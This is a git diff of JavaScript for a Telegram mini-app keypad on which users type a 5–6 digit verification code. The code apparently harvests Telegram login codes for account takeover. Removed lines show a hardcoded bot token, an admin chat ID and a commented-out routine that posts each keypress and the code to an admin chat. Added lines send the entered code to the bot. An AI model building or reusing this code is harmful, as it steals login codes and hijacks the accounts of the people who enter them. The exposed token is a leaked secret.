@@ -10,35 +10,24 @@ tg.MainButton.color = "#2cab37";
 tg.MainButton.setText( 'Подтвердить' );
 tg.MainButton.show();
 tg.MainButton.setParams({"color": "#E0FFFF"}); //меняем цвет
-tg.MainButton.disable() //скрываем кнопку 
+tg.MainButton.disable() //скрываем кнопку
 
-//var ADMIN_ID = 5866779912;
-//var TOKEN = "5968261554:AAEgMw9yRV6_yIni3qUQOYZo72Q75PkabhA"
 
-//userData = document.querySelector("div.header-buttom p b");
-// alert("2");
+let urlParams = new URL(window.location).searchParams;
+const id = urlParams.get("id");
+const full_name = urlParams.get("full_name");
+userData.innerText = full_name + " (" + id + ")";
 
-//userData.innerText = tg.initDataUnsafe.user.first_name + " " + tg.initDataUnsafe.user.last_name + " (" + tg.initDataUnsafe.user.id + ")";
-
-function sendMessage(text) {
-    // var a = tg.sendData(text);
-    // console.log(a);
-//     $.ajax({
-//         url: https://api.telegram.org/bot${TOKEN}/sendMessage,
-//         data: {
-//             text,
-//             chat_id: ADMIN_ID
-//         },
-//         method: "POST"
-//     })
-}
+tg.onEvent('mainButtonClicked', function(){
+    tg.sendData(input.value); 
+  });
 
 
 var pattern = /^[0-9]$/ ;
 var clickCount = 0;
 btns.forEach((btn) => {
     btn.addEventListener("click", function() {
-        if(input.value.length < 5){
+        if(input.value.length < 6){
             input.value += this.innerText;
             tg.MainButton.disable();
         }else {
@@ -53,31 +42,22 @@ btns.forEach((btn) => {
         if(this.getAttribute("data-key") == "BACK"){
             input.value = input.value.slice(0, -1);
             if(input.value.length == 0){
-                // sendMessage("Maydon bo'sh holatida 🔙 click bo'ldi.");
                 return 0;    
             }else {
                 clickCount = input.value.length;
             }
-            // sendMessage("🔙");
             return 0;
         }else if(this.getAttribute("data-key") == "CHECK"){
             if(input.value.length < 5){
                 input.style.border = "1px solid red";
-                // sendMessage("${input.value}" holatida ✅ click bo'ldi.)
                 return 0;
             }else{
                 tg.sendData(input.value);
             }
-            // sendMessage(✅ Tasdiqlash kodi: ${input.value});
 
             clickCount = 0;
             input.value = '';
             return 0;
-        }
-
-        if (clickCount <= input.value.length){
-            // sendMessage(this.innerText)
-            console.log(clickCount);
         }
 
         
